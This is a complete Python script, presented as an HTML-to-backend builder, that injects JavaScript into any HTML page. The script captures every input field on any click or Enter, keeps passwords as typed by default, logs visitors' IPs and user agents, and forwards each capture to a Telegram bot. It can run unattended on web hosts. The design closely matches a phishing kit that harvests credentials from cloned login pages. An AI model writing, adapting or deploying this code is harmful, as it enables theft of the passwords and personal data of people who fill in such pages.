#!/usr/bin/env python3
"""
html_backend_builder.py  -  Termux / Linux / Windows / macOS / any web host

Turns a plain HTML file into a working backend that saves every form
submission to JSON *and* forwards it straight to a Telegram bot.

On every start it asks (in order):
  1. Path to your HTML file
  2. Your Telegram bot token
It then auto-detects your chat id, sends a test message so you know
right away whether Telegram is working, and resends any records that
were saved to JSON earlier but never made it to Telegram (e.g. token
was wrong last time, or Telegram was briefly down). After that the
backend stays active: every new submission is saved to JSON AND sent
to Telegram immediately.

Works the same way when deployed as a web app (Render, Railway, etc.):
set environment variables instead of typing at a prompt -
    HTML_FILE=page.html
    TELEGRAM_BOT_TOKEN=123:ABC
    TELEGRAM_CHAT_ID=987654      (optional - auto-detected if omitted)
A deploy has no terminal to type into, so when HTML_FILE and
TELEGRAM_BOT_TOKEN are both already set as environment variables, the
two prompts are skipped automatically and startup continues straight
through - that's what lets this run unattended on a host.

Usage (interactive):
    python html_backend_builder.py
Usage (flags skip the prompts):
    python html_backend_builder.py page.html --tg-token 123:ABC
    python html_backend_builder.py page.html --tg-token 123:ABC --tg-chat 987654

Standard library only - no pip install needed.
"""
import argparse
import hashlib
import json
import mimetypes
import os
import re
import secrets
import sys
import tempfile
import threading
import time
import urllib.error
import urllib.request
import uuid
from datetime import datetime, timezone
from html.parser import HTMLParser
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.parse import unquote, urlparse

MAX_BODY = 1_000_000
PBKDF2_ROUNDS = 200_000
LOCK = threading.Lock()
EMAIL_RE = re.compile(r"^[^@\s]+@[^@\s]+\.[^@\s]+$")
BLOCKED_EXT = {".py", ".json", ".env", ".db", ".sqlite"}

INJECT_JS = """
<script>
(function () {
  var lastSig = '', lastTime = 0;

  function label(el, t) {
    return el.name || el.id || el.getAttribute('aria-label') || el.placeholder || t;
  }
  function collect(scope) {
    var out = [];
    scope.querySelectorAll('input,textarea,select').forEach(function (el) {
      var t = (el.type || el.tagName).toLowerCase();
      if (['submit','button','reset','image','file','hidden'].indexOf(t) > -1) return;
      if ((t === 'checkbox' || t === 'radio') && !el.checked) return;
      out.push({ name: label(el, t), type: t, value: el.value });
    });
    return out;
  }
  function send(scope, formId) {
    var fields = collect(scope);
    if (!fields.some(function (f) { return String(f.value).trim() !== ''; })) return;
    var body = JSON.stringify({ form: formId, fields: fields });
    var now = Date.now();
    if (body === lastSig && now - lastTime < 1500) return;
    lastSig = body; lastTime = now;
    fetch('/api/save', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: body,
      keepalive: true
    }).then(function (r) { return r.json(); })
      .then(function (j) { console.log('[backend]', j); })
      .catch(function (e) { console.error('[backend] save failed', e); });
  }
  function scopeOf(el) { return el.closest('form') || document; }
  function idOf(s) { return s === document ? 'page' : (s.id || s.name || 'form'); }

  document.addEventListener('submit', function (e) { send(e.target, idOf(e.target)); }, true);
  document.addEventListener('click', function (e) {
    var b = e.target.closest && e.target.closest(
      'button,input[type=submit],input[type=button],[role=button]');
    if (!b) return;
    var s = scopeOf(b);
    send(s, idOf(s));
  }, true);
  document.addEventListener('keydown', function (e) {
    if (e.key !== 'Enter' || e.isComposing) return;
    var el = e.target;
    if (!el || !el.tagName) return;
    var tag = el.tagName.toLowerCase();
    if (tag !== 'input' && tag !== 'select') return;
    var t = (el.type || '').toLowerCase();
    if (['button','submit','reset','checkbox','radio'].indexOf(t) > -1) return;
    var s = scopeOf(el);
    send(s, idOf(s));
  }, true);
})();
</script>
"""


# ------------------------------------------------------------ helpers ----
def setup_console():
    for s in (sys.stdout, sys.stderr):
        try:
            s.reconfigure(encoding="utf-8", errors="replace")
        except Exception:
            pass


def clean_path(raw):
    raw = raw.strip().strip('"').strip("'")
    if raw.lower().startswith("file:"):
        raw = unquote(urlparse(raw).path)
        if os.name == "nt" and len(raw) > 2 and raw[0] == "/" and raw[2] == ":":
            raw = raw[1:]
    return Path(os.path.expandvars(os.path.expanduser(raw)))


def read_html(path):
    data = path.read_bytes()
    if data.startswith((b"\xff\xfe", b"\xfe\xff")):
        return data.decode("utf-16", errors="replace")
    for enc in ("utf-8-sig", "cp1252"):
        try:
            return data.decode(enc)
        except UnicodeDecodeError:
            pass
    return data.decode("latin-1", errors="replace")


def inject(html):
    m = list(re.finditer(r"</body\s*>", html, re.IGNORECASE))
    if m:
        i = m[-1].start()
        return html[:i] + INJECT_JS + html[i:]
    return html + INJECT_JS


class FieldScanner(HTMLParser):
    def __init__(self):
        super().__init__()
        self.found = []

    def handle_starttag(self, tag, attrs):
        if tag in ("input", "textarea", "select"):
            a = dict(attrs)
            t = (a.get("type") or tag).lower()
            if t not in ("submit", "button", "reset", "image", "file", "hidden"):
                self.found.append((a.get("name") or a.get("id") or a.get("placeholder") or t, t))


# ------------------------------------------------------------ storage ----
def hash_password(pw):
    salt = secrets.token_hex(16)
    dk = hashlib.pbkdf2_hmac("sha256", pw.encode("utf-8"), bytes.fromhex(salt), PBKDF2_ROUNDS)
    return f"pbkdf2_sha256${PBKDF2_ROUNDS}${salt}${dk.hex()}"


def build_record(payload, plain_passwords, meta):
    if not isinstance(payload, dict) or not isinstance(payload.get("fields"), list):
        raise ValueError("invalid payload")
    data = {}
    for f in payload["fields"][:200]:
        if not isinstance(f, dict):
            continue
        name = str(f.get("name", "field"))[:100]
        ftype = str(f.get("type", "text")).lower()[:20]
        value = str(f.get("value", ""))[:10000]
        if ftype == "email":
            value = value.strip().lower()
            if value and not EMAIL_RE.match(value):
                raise ValueError(f"invalid email in '{name}'")
        elif ftype == "password":
            if value and not plain_passwords:
                value = hash_password(value)
        elif ftype != "textarea":
            value = value.strip()
        if name in data:
            if not isinstance(data[name], list):
                data[name] = [data[name]]
            data[name].append(value)
        else:
            data[name] = value
    if not any(str(v).strip() for v in data.values()):
        raise ValueError("no data")
    return {
        "id": uuid.uuid4().hex,
        "timestamp": datetime.now(timezone.utc).isoformat(timespec="seconds"),
        "form": str(payload.get("form", "form"))[:100],
        "data": data,
        "tg_sent": False,
        **meta,
    }


def load_db(db_path):
    if not db_path.exists():
        return {"records": []}
    try:
        loaded = json.loads(db_path.read_text(encoding="utf-8"))
        if isinstance(loaded, dict) and isinstance(loaded.get("records"), list):
            return loaded
    except Exception:
        backup = db_path.with_suffix(".corrupt.json")
        os.replace(db_path, backup)
        print(f"[warn] bad JSON moved to {backup.name}")
    return {"records": []}


def write_db(db_path, db):
    db["total"] = len(db["records"])
    fd, tmp = tempfile.mkstemp(dir=str(db_path.parent), suffix=".tmp")
    try:
        with os.fdopen(fd, "w", encoding="utf-8", newline="\n") as fh:
            json.dump(db, fh, indent=2, ensure_ascii=False)
            fh.write("\n")
        os.replace(tmp, db_path)
    except Exception:
        if os.path.exists(tmp):
            os.remove(tmp)
        raise


def save_record(db_path, record):
    with LOCK:
        db = load_db(db_path)
        db["records"].append(record)
        write_db(db_path, db)
        return len(db["records"])


def mark_sent(db_path, record_id):
    with LOCK:
        db = load_db(db_path)
        for r in db["records"]:
            if r.get("id") == record_id:
                r["tg_sent"] = True
                break
        write_db(db_path, db)


# ----------------------------------------------------------- telegram ----
TG_API = os.environ.get("TELEGRAM_API_BASE", "https://api.telegram.org")


def tg_call(token, method, payload=None, retries=2):
    url = f"{TG_API}/bot{token}/{method}"
    body = json.dumps(payload or {}).encode("utf-8")
    for attempt in range(retries + 1):
        req = urllib.request.Request(url, data=body, headers={"Content-Type": "application/json"})
        try:
            with urllib.request.urlopen(req, timeout=15) as r:
                return json.loads(r.read().decode("utf-8"))
        except urllib.error.HTTPError as e:
            try:
                err = json.loads(e.read().decode("utf-8"))
            except Exception:
                err = {"ok": False, "description": f"HTTP {e.code} {e.reason}"}
            print(f"[telegram] {method} failed: {err.get('description')}")
            return err
        except Exception as e:
            print(f"[telegram] {method} network error: {type(e).__name__} (attempt {attempt + 1})")
            time.sleep(1.5 * (attempt + 1))
    return None


def tg_discover_chat(token):
    res = tg_call(token, "getUpdates")
    if res and res.get("ok"):
        for upd in reversed(res.get("result", [])):
            msg = upd.get("message") or upd.get("channel_post") or {}
            if msg.get("chat", {}).get("id") is not None:
                return str(msg["chat"]["id"])
    return None


def tg_format(record, backlog=False):
    head = "Submission (from earlier, resent)" if backlog else "New submission"
    lines = [head, f"Form: {record['form']}", f"Time (UTC): {record['timestamp']}", ""]
    for k, v in record["data"].items():
        if isinstance(v, list):
            v = ", ".join(str(x) for x in v)
        lines.append(f"{k}: {v}")
    return "\n".join(lines)[:4000]


def tg_send(token, chat_id, record, backlog=False):
    res = tg_call(token, "sendMessage", {"chat_id": chat_id, "text": tg_format(record, backlog)})
    ok = bool(res and res.get("ok"))
    print(f"[telegram] {'sent' if ok else 'FAILED'} ({record['form']}, id={record['id'][:8]})")
    return ok


def tg_resend_backlog(db_path, token, chat_id):
    """On startup: push every JSON record not yet confirmed sent to Telegram."""
    db = load_db(db_path)
    pending = [r for r in db["records"] if not r.get("tg_sent")]
    if not pending:
        print("[telegram] backlog: nothing pending")
        return
    print(f"[telegram] backlog: resending {len(pending)} unsent record(s)...")
    sent = 0
    for r in pending:
        if tg_send(token, chat_id, r, backlog=True):
            mark_sent(db_path, r["id"])
            sent += 1
        time.sleep(0.3)   # stay well under Telegram's rate limit
    print(f"[telegram] backlog: {sent}/{len(pending)} delivered")


# ------------------------------------------------------------- server ----
class Handler(BaseHTTPRequestHandler):
    server_version = "HtmlBackend/3.0"

    def log_message(self, fmt, *args):
        print("[http]", fmt % args)

    def _send(self, code, body, ctype="application/json; charset=utf-8"):
        if isinstance(body, (dict, list)):
            body = json.dumps(body, ensure_ascii=False).encode("utf-8")
        elif isinstance(body, str):
            body = body.encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("X-Content-Type-Options", "nosniff")
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        cfg = self.server.cfg
        path = unquote(urlparse(self.path).path)
        if path in ("/", "/" + cfg["html"].name):
            try:
                page = inject(read_html(cfg["html"]))
            except OSError as e:
                return self._send(500, {"ok": False, "error": str(e)})
            return self._send(200, page, "text/html; charset=utf-8")
        if path == "/healthz":
            return self._send(200, {"ok": True})

        target = (cfg["base"] / path.lstrip("/")).resolve()
        try:
            target.relative_to(cfg["base"])
        except ValueError:
            return self._send(403, {"ok": False, "error": "forbidden"})
        if (not target.is_file() or target.name.startswith(".")
                or target.suffix.lower() in BLOCKED_EXT or target == cfg["db"]):
            return self._send(404, {"ok": False, "error": "not found"})
        ctype = mimetypes.guess_type(str(target))[0] or "application/octet-stream"
        self._send(200, target.read_bytes(), ctype)

    def do_POST(self):
        if urlparse(self.path).path != "/api/save":
            return self._send(404, {"ok": False, "error": "not found"})
        cfg = self.server.cfg
        origin = self.headers.get("Origin")
        if origin and urlparse(origin).netloc != self.headers.get("Host"):
            return self._send(403, {"ok": False, "error": "bad origin"})
        try:
            length = int(self.headers.get("Content-Length", "0"))
        except ValueError:
            length = 0
        if length <= 0 or length > MAX_BODY:
            return self._send(413, {"ok": False, "error": "bad size"})
        meta = {
            "ip": self.client_address[0],
            "user_agent": (self.headers.get("User-Agent") or "")[:200],
        }
        try:
            payload = json.loads(self.rfile.read(length).decode("utf-8"))
            record = build_record(payload, cfg["plain"], meta)
            total = save_record(cfg["db"], record)
        except (ValueError, UnicodeDecodeError) as e:
            return self._send(400, {"ok": False, "error": str(e)})
        except OSError as e:
            return self._send(500, {"ok": False, "error": f"save failed: {e}"})

        print(f"[received] {record['form']}: {list(record['data'])} -> json #{total}")
        if cfg["tg_token"] and cfg["tg_chat"]:
            def push():
                if tg_send(cfg["tg_token"], cfg["tg_chat"], record):
                    mark_sent(cfg["db"], record["id"])
            threading.Thread(target=push, daemon=True).start()
        self._send(200, {"ok": True, "id": record["id"], "total": total})


# --------------------------------------------------------------- setup ----
def ask(prompt):
    try:
        return input(prompt).strip()
    except (EOFError, KeyboardInterrupt):
        print()
        sys.exit(1)


def resolve_html_path(cli_value):
    """Step 1: get the HTML path - env var (deploy) > CLI arg > interactive prompt."""
    raw = cli_value or os.environ.get("HTML_FILE")
    while True:
        if not raw:
            raw = ask("HTML file path: ")
        path = clean_path(raw).resolve()
        if path.is_file():
            return path
        msg = f"File not found: {path}"
        if "com.termux" in os.environ.get("PREFIX", ""):
            msg += "  (Termux tip: run termux-setup-storage, use ~/storage/shared/...)"
        print(msg)
        if os.environ.get("HTML_FILE"):
            sys.exit("HTML_FILE env var points to a missing file.")
        raw = None   # ask again


def resolve_telegram(cli_token, cli_chat):
    """Step 2: get bot token, then auto-discover chat id. Verifies both with a live test."""
    token = cli_token or os.environ.get("TELEGRAM_BOT_TOKEN")
    if not token:
        token = ask("Telegram bot token (from @BotFather, Enter to skip Telegram): ")
    if not token:
        return "", ""

    chat = cli_chat or os.environ.get("TELEGRAM_CHAT_ID") or ""
    if not chat:
        print("[telegram] looking up chat id (send /start to your bot first if this is empty)...")
        chat = tg_discover_chat(token) or ""
        for _ in range(3):
            if chat:
                break
            print("[telegram] no chat found yet - send /start to your bot now.")
            if not sys.stdin.isatty():
                break
            ask("Press Enter after you've sent /start... ")
            chat = tg_discover_chat(token) or ""

    if not chat:
        print("[telegram] could not auto-detect chat id. Telegram forwarding is OFF "
              "(JSON saving still works). Restart after sending /start to fix this.")
        return "", ""

    print(f"[telegram] chat id found: {chat}")
    test = tg_call(token, "sendMessage", {"chat_id": chat, "text": "Backend connected. Test OK."})
    if test and test.get("ok"):
        print("[telegram] CONNECTED - test message delivered successfully.")
        return token, chat
    print(f"[telegram] CONNECTION FAILED: {test.get('description') if test else 'no response'}")
    print("[telegram] Telegram forwarding is OFF; JSON saving still works.")
    return "", ""


def main():
    setup_console()
    ap = argparse.ArgumentParser(description="HTML -> backend -> JSON + Telegram bot")
    ap.add_argument("html", nargs="?", help="path to the HTML file")
    ap.add_argument("--port", type=int, default=int(os.environ.get("PORT", 8000)))
    ap.add_argument("--host", default="0.0.0.0" if os.environ.get("PORT") else "127.0.0.1")
    ap.add_argument("--tg-token", default=None)
    ap.add_argument("--tg-chat", default=None)
    ap.add_argument("--hash-passwords", action="store_true",
                    help="hash passwords (PBKDF2) instead of saving them as typed")
    args = ap.parse_args()

    # Step 1: HTML path
    html_path = resolve_html_path(args.html)
    scanner = FieldScanner()
    scanner.feed(read_html(html_path))
    db_path = html_path.with_name(html_path.stem + "_data.json")

    # Step 2: Telegram token -> auto chat id -> live test
    tg_token, tg_chat = resolve_telegram(args.tg_token, args.tg_chat)

    # Every start: push anything saved earlier that never reached Telegram
    if tg_token and tg_chat:
        tg_resend_backlog(db_path, tg_token, tg_chat)

    server = None
    port_range = [args.port] if os.environ.get("PORT") else range(args.port, args.port + 11)
    for port in port_range:
        try:
            server = ThreadingHTTPServer((args.host, port), Handler)
            break
        except OSError:
            continue
    if server is None:
        sys.exit(f"No free port starting at {args.port}")

    server.cfg = {"html": html_path, "base": html_path.parent, "db": db_path,
                  "plain": not args.hash_passwords,
                  "tg_token": tg_token, "tg_chat": tg_chat}

    print(f"\nDetected inputs : {len(scanner.found)}")
    for name, t in scanner.found:
        print(f"   - {name} ({t})")
    print(f"Passwords       : {'clean text (as typed)' if not args.hash_passwords else 'hashed'}")
    print(f"Open in browser : http://{'127.0.0.1' if args.host == '0.0.0.0' else args.host}:{server.server_address[1]}/")
    print(f"Data saved to   : {db_path}")
    print(f"Telegram        : {'ACTIVE - every submission forwarded' if tg_token else 'off'}")
    print("Backend is active. Stop with Ctrl+C\n")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nStopped.")
    finally:
        server.server_close()


if __name__ == "__main__":
    main()
